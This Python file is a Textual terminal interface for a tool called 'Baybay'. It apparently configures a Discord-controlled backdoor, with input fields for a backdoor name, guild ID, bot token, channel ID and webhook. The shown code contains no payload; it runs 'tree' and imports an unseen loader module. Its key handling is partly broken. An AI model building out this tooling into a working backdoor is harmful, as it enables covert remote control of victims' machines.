from textual.app import App, ComposeResult
from textual.widgets import Button, Static, Log
from textual.containers import Center, Vertical, Horizontal, Container
from textual.screen import Screen
from textual.widget import Widget
from textual.reactive import reactive
from textual.timer import Timer
import pyperclip
import subprocess

HELP_TABS = [
    ("help", "This is the help section. Use up/down arrows to navigate."),
    ("set", "Set configuration options here."),
    ("build", "Build your project from this tab."),
    ("download", "Manage your downloads here."),
    ("quit", "Quit the application from here."),
]

class HelpTab(Horizontal):
    def __init__(self, tab_index: int = 0):
        super().__init__()
        self.tab_index = tab_index

    def compose(self) -> ComposeResult:
        yield Center(
            Vertical(
                *[
                    Static(
                        tab,
                        classes="selected" if i == self.tab_index else "",
                    )
                    for i, (tab, _) in enumerate(HELP_TABS)
                ],
                id="help-menu"
            )
        )
        yield Static(HELP_TABS[self.tab_index][1], id="help-detail")


class TabScreen(Screen):
    def __init__(self):
        super().__init__()
        self.active_tab = "terminal"
        self.help_tab_index = 0
        self.set_field_index = 0
        self.set_editing = False
        self.set_values = {
            "bakdoor_name": "",
            "guild_id": "",
            "bot_token": "",
            "channel_id": "",
            "webhook": "",
        }

    def compose(self) -> ComposeResult:
        yield Center(
            Vertical(
                Static(self.render_tab_bar(), id="tab-bar"),
                Container(id="tab-content"),
                Static("─" * 80, id="footer-line"),
                Static("r restart      h help     q quit", id="footer-hints"),
                id="tab-area"
            )
        )

    def render_tab_bar(self) -> str:
        top = "┌───────────────────┬──────────────────┬──────────────────┬──────────────────┐"
        middle = (
            "│"
            f" {'baybay'.center(17)} │"
            f" {'s set-config'.center(16)} │"
            f" {'d download'.center(16)} │"
            f" {'h help'.center(16)} │"
        )
        bottom = "└───────────────────┴──────────────────┴──────────────────┴──────────────────┘"
        return f"{top}\n{middle}\n{bottom}"

    def render_help_widget(self) -> Center:
        return Center(
            HelpTab(tab_index=self.help_tab_index),
            id="help-tab"
        )

    def render_tab_content(self):
        if self.active_tab == "terminal":
            return Static(
                    "██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗\n"
                    "██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n"
                    "██████╔╝███████║ ╚████╔╝ ██████╔╝███████║ ╚████╔╝ \n"
                    "██╔══██╗██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║  ╚██╔╝  \n"
                    "██████╔╝██║  ██║   ██║   ██████╔╝██║  ██║   ██║   \n"
                    "╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \n\n"
                    "              build by vicky aka admin12121\n"
                    "              github: admin12121\n",
                    id="tab-content",
                    expand=False
                )
        elif self.active_tab == "set":
            return self.compose_set_tab()
        elif self.active_tab == "download":
            return Static(

                    "Download Tab\n"
                    "=============\n"
                    "Manage your downloads here:\n"
                    "- View current downloads\n"
                    "- Pause/Resume\n"
                    "- Cancel downloads\n"
                    "\n"
                    "Press 'b' to return to Baybay terminal.",
                    id="tab-content",
                    expand=False
                )
        elif self.active_tab == "help":
            return self.render_help_widget()

        return Static("")

    def on_mount(self):
        self.mount_tab_content()

    def mount_tab_content(self):
        container = self.query("#tab-content").first()
        if container:
            container.remove_children()
            container.mount(Center(self.render_tab_content()))

    def on_key(self, event):
        key = event.key

        if self.active_tab == "set":
            fields = list(self.query("CLIField").results())
            if not fields:
                return
            for field in fields:
                field.selected = False
            fields[self.set_field_index].selected = True

            if not self.set_editing:
                if key in {"b", "s", "d", "h", "q"}:
                    if key == "q":
                        self.app.exit()
                        return
                    self.active_tab = {
                        "b": "terminal",
                        "s": "set",
                        "d": "download",
                        "h": "help"
                    }[key]
                    self.mount_tab_content()
                    return
                if key == "down":
                    self.set_field_index = (self.set_field_index + 1) % len(fields)
                elif key == "up":
                    self.set_field_index = (self.set_field_index - 1) % len(fields)
                elif key == "right":
                    self.set_editing = True
                    fields[self.set_field_index].editing = True
                for i, field in enumerate(fields):
                    field.selected = (i == self.set_field_index)
            else:
                fields[self.set_field_index].on_key(event)
                if key == "left":
                    self.set_editing = False
                    fields[self.set_field_index].editing = False
                    # Save value
                    field_id = fields[self.set_field_index].id
                    self.set_values[field_id] = fields[self.set_field_index].value
                    # Check if all fields are filled and remount
                    if all(f.value.strip() for f in fields):
                        self.mount_tab_content()
            return

        if key == "b":
            self.active_tab = 0
            self.mount_tab_content()
        elif key == "s":
            self.active_tab = 1
            self.mount_tab_content()
        elif key == "d":
            self.active_tab = 2
            self.mount_tab_content()
        elif key == "h":
            self.active_tab = 3
            self.mount_tab_content()
        if self.active_tab == "help":
            if key == "up":
                self.help_tab_index = (self.help_tab_index - 1) % len(HELP_TABS)
            elif key == "down":
                self.help_tab_index = (self.help_tab_index + 1) % len(HELP_TABS)
            elif key == "b":
                self.active_tab = "terminal"
            elif key == "q":
                self.app.exit()
                return
            self.mount_tab_content()
            return

        if key in {"s", "d", "h", "b"}:
            self.active_tab = {
                "s": "set",
                "d": "download",
                "h": "help",
                "b": "terminal"
            }[key]
            self.mount_tab_content()
        elif key == "q":
            self.app.exit()

    def compose_set_tab(self):
        fields = [
            CLIField("Backdoor Name", value=self.set_values["bakdoor_name"], id="bakdoor_name"),
            CLIField("Guild ID", value=self.set_values["guild_id"], id="guild_id"),
            CLIField("Bot Token", value=self.set_values["bot_token"], id="bot_token"),
            CLIField("Channel ID", value=self.set_values["channel_id"], id="channel_id"),
            CLIField("WebHook", value=self.set_values["webhook"], id="webhook"),
        ]
        all_filled = all(f.value.strip() for f in fields)
        children = fields
        if all_filled and not any(f.editing for f in fields):
            children.append(Button("Set Config", id="set-config-btn"))
        return Vertical(*children, id="set-cli-fields")

    async def on_button_pressed(self, event):
        if event.button.id == "set-config-btn":
            set_tab = self.query_one("#set-cli-fields")
            await set_tab.remove()
            container = self.query("#tab-content").first()
            log = Static("", id="tree-log")  # Use Static for simple output
            await container.mount(log)
            proc = subprocess.Popen(
                ["tree"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True
            )
            output_lines = []
            for line in proc.stdout:
                output_lines.append(line.rstrip())
                # Join lines with \n and update the Static widget
                log.update("\n".join(output_lines))
            proc.wait()


class CLIField(Widget):
    value = reactive("")
    editing = reactive(False)
    selected = reactive(False)
    cursor_visible = reactive(True)
    MAX_WORDS = 150
    MAX_DISPLAY = 48

    def __init__(self, label: str, value: str = "", id: str = None):
        super().__init__(id=id)
        self.label = label
        self.value = value
        self._cursor_timer: Timer | None = None

    def sanitize(self, text):
        return " ".join(text.strip().split())

    def truncate_middle(self, text):
        max_len = self.MAX_DISPLAY
        if len(text) <= max_len:
            return text
        keep = max_len // 2 - 3
        return f"{text[:keep]}...{text[-keep:]}"

    def render(self):
        cursor = "▏" if self.editing and self.cursor_visible else ""
        left = f"{self.label:<14} "
        middle = f" > "
        display_value = self.truncate_middle(self.value)
        right = f"{display_value}{cursor}"
        if self.selected:
            return f"[reverse]{left}[/reverse]{middle}{right}"
        return f"{left}{middle}{right}"

    def on_key(self, event):
        if self.editing:
            words = self.value.split()
            if event.key == "enter":
                self.value = self.sanitize(self.value)
                self.editing = False
                self.selected = True
                self.refresh()
                if hasattr(self.app.screen, "mount_tab_content"):
                    self.app.screen.mount_tab_content()
            elif event.key == "backspace":
                self.value = self.value[:-1]
                self.refresh()
            elif event.key in ("ctrl+v", "paste"):
                try:
                    paste_text = pyperclip.paste()
                    if paste_text:
                        paste_text = self.sanitize(paste_text)
                        new_words = paste_text.split()
                        if len(words) + len(new_words) <= self.MAX_WORDS:
                            self.value += paste_text
                        else:
                            allowed = self.MAX_WORDS - len(words)
                            self.value += " ".join(new_words[:allowed])
                        self.refresh()
                except Exception:
                    pass
            elif event.is_printable:
                if len(words) < self.MAX_WORDS or event.character.isspace():
                    self.value += event.character
                    self.refresh()

    async def watch_editing(self, editing: bool):
        if editing:
            if not self._cursor_timer:
                self._cursor_timer = self.set_interval(0.5, self._toggle_cursor)
        else:
            if self._cursor_timer:
                self._cursor_timer.stop()
                self._cursor_timer = None
            self.cursor_visible = True
        self.refresh()

    def _toggle_cursor(self):
        self.cursor_visible = not self.cursor_visible
        self.refresh()


class BaybayApp(App):
    CSS = """
    Screen {
        align: center middle;
        background: #181b20;
    }

    #tab-area {
        align: center middle;
        content-align: center middle;
        padding: 1;
    }

    #tab-bar {
        color: white;
        content-align: center middle;
    }

    #tab-content {
        align: center middle;
        content-align: center middle;
        padding: 1;
        height: 25;
    }

    #footer-line {
        color: #666;
        content-align: center middle;
    }

    #footer-hints {
        color: #888;
        content-align: center middle;
        padding-top: 1;
    }

    #help-tab {
        width: 75;
        align: center middle;
        content-align: center middle;
    }
    
    #help-menu {
        width: 15;
        padding: 1;
        color: cyan;
    }

    #help-detail {
        width: 60;
        padding: 2;
    }

    .selected {
        background: cyan;
        color: black;
        width: 100%;
        text-align: left;
    }

    #set-cli-fields{
        width: 75;
        padding: 0 2;
        align: center middle;
        content-align: center middle;
        layout: vertical;
        align: left top;
        padding: 2 4;
    }

    CLIField {
        width: 75;
        padding: 0 2;
        height: 2;
    }

    CLIField.selected {
        background: cyan;
        color: black;
    }

    
    Horizontal {
        layout: horizontal;
        height: auto;
        min-height: 3;
        padding-bottom: 1;
        align: left middle;
        content-align: left middle;
    }

    #tree-log {
        width: 100%;
        height: auto;
        overflow-x: hidden;
        color: white;
    }
    """

    def on_mount(self):
        self.push_screen(TabScreen())


if __name__ == "__main__":
    from loader import loader
    loader()
    BaybayApp().run()
